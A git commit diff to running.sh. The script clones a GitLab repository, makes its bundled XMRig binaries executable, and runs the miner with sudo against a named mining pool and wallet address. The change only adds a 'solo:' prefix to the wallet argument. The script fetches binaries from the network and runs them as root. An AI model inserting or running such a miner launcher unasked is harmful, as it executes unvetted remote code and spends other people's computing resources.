d587c39b0bd2443c2ad21ee23758fe0d4bb96b84
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-25 12:36:48 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -2,4 +2,4 @@
 git clone https://gitlab.com/rumah2/xdag.git
 cd xdag
 chmod 500 xmrigDaemon xmrigMiner 
-sudo ./xmrigDaemon --donate-level 1 -o sf.pool-pay.com:4026 -u SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -k -t 8
+sudo ./xmrigDaemon --donate-level 1 -o sf.pool-pay.com:4026 -u solo:SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -k -t 8
